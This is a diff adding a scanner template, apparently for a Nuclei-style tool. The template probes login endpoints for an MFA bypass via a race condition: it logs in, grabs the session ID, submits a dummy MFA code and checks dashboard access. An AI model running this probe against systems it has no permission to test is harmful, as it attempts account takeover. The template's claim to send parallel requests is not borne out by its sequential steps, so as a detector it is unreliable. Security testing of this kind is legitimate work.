@@ -1,0 +1,84 @@
+id: custom-2026-auth-003
+info:
+  name: MFA Bypass - Race Condition in Token Validation
+  author: SecurityTeam
+  severity: critical
+  description: |
+    Exploits race condition in MFA token validation:
+    1. User submits password (first factor)
+    2. System requires MFA code (second factor)
+    3. Race condition: Check if MFA was verified before validation completes
+    4. Send parallel requests to bypass token timing window
+    
+    Behavioral detection:
+    - Timing analysis of MFA endpoint responses
+    - Session state analysis between requests
+    - Concurrent request handling analysis
+  
+  Reference:
+    - https://www.infosecurity-magazine.com/articles/twitter-twofa-bypass/
+
+requests:
+  - method: POST
+    path: /login
+    headers:
+      Content-Type: "application/json"
+    body: |
+      {
+        "username": "{{username}}",
+        "password": "{{password}}"
+      }
+    
+    extractors:
+      - type: regex
+        internal: true
+        name: session_id
+        regex: 'session[id]*[=:]\s*([a-f0-9]{32})'
+
+  - method: POST
+    path: /api/dashboard
+    headers:
+      Cookie: "session_id={{session_id}}"
+    
+    matchers:
+      - type: word
+        part: body
+        negative: true
+        words:
+          - '"authenticated":true'
+
+  - method: POST
+    path: /verify-mfa
+    headers:
+      Content-Type: "application/json"
+      Cookie: "session_id={{session_id}}"
+    body: |
+      {
+        "code": "000000",
+        "attempt": 1
+      }
+    
+    matchers:
+      - type: dsl
+        expressions:
+          # Request before MFA validation to check for race window
+          - 'response_time < 100'
+        condition: all
+
+  - method: POST
+    path: /api/dashboard
+    headers:
+      Cookie: "session_id={{session_id}}"
+    delay: 50
+    
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"authenticated":true'
+
+tags:
+  - authentication
+  - mfa
+  - race-condition
+  - token-bypass
